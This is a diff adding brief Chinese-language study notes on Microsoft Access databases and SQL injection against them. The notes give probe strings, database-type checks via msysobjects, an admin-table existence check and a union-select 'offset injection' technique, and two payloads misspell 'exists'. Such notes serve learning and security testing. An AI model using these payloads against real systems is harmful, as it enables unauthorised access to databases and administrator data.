@@ -1,0 +1,16 @@
+Access数据库
+缺陷：
+  1、数据库过大时，一般达到100M左右性能下降
+  2、容易出现数据库错误
+  3、安全性较差
+数据库后缀名：
+  *.mdb
+打开工具：
+  辅臣
+  破障数据库查看
+Access注入
+  判断注入点:单引号',and 1=1， and 1=2
+  判断数据库类型：and exsits (select * from msysobjects)>0  代表access数据库 或者 and exsits (select * from sysobjects)>0  代表sqlserver
+  判断数据库表：and exists(select * from admin)  判断是否存在admin表
+  偏移注入：用于解决猜到表名，猜不到列名的情况。用*代替字段进行猜解 id=1 union select 1,2,3,4,5,...,15* from admin 挨个替换为*号，直至显示正常为止
+           带入计算公式 22-16(显示正常数字)=6  10+6*2=22  4+6*3=22
